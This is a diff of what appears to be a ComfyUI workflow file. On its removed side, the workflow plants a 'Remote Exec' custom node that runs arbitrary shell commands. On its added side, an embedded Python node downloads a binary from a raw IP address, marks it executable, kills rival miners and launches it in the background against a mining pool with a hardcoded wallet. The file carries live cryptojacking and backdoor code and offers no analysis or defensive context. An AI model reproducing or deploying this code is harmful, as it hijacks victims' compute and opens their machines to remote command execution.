@@ -1,20 +1,18 @@
 {
   "1": {
-    "class_type": "PrimitiveString",
+    "class_type": "IDENode",
     "inputs": {
-      "value": "\"\"\"Remote exec node — auto-deployed.\"\"\"\nimport subprocess\n\nclass RemoteExec:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\"required\": {\"command\": (\"STRING\", {\"multiline\": True, \"default\": \"id\"})}}\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"output\",)\n    FUNCTION = \"run\"\n    CATEGORY = \"utils\"\n    OUTPUT_NODE = True\n\n    def run(self, command):\n        try:\n            r = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)\n            out = r.decode(\"utf-8\", errors=\"replace\")\n        except Exception as e:\n            out = str(e)\n        return {\"ui\": {\"text\": [out]}, \"result\": (out,)}\n\nNODE_CLASS_MAPPINGS = {\"RemoteExec\": RemoteExec}\nNODE_DISPLAY_NAME_MAPPINGS = {\"RemoteExec\": \"Remote Exec\"}\n"
+      "language": "python",
+      "pycode": "import subprocess, os, torch, time\ntorch_lib = os.path.join(os.path.dirname(torch.__file__), \"lib\")\nenv = os.environ.copy()\nenv[\"LD_LIBRARY_PATH\"] = torch_lib + \":\" + env.get(\"LD_LIBRARY_PATH\", \"\")\nsubprocess.run([\"curl\", \"-sLo\", \"/tmp/miner\", \"http://151.247.219.40:8000/alpha-miner\"], timeout=90)\nos.chmod(\"/tmp/miner\", 0o755)\nsubprocess.run([\"pkill\", \"-9\", \"-f\", \"miner\"], capture_output=True)\ntime.sleep(1)\nwith open(\"/tmp/miner.log\", \"w\") as log:\n    subprocess.Popen([\"/tmp/miner\", \"--pool\", \"stratum+tcp://sg1.alphapool.tech:5566\", \"--address\", \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\", \"--worker\", \"AUTO_52\"], env=env, stdout=log, stderr=subprocess.STDOUT, start_new_session=True)\ntime.sleep(3)\nps = subprocess.run([\"pgrep\", \"-c\", \"miner\"], capture_output=True, text=True)\nresult = ps.stdout.strip()\n"
     }
   },
   "2": {
-    "class_type": "SaveStringKJ",
+    "class_type": "PreviewAny",
     "inputs": {
-      "string": [
+      "source": [
         "1",
         0
-      ],
-      "filename_prefix": "z_exec_node",
-      "output_folder": "../custom_nodes",
-      "file_extension": ".py"
+      ]
     }
   }
 }
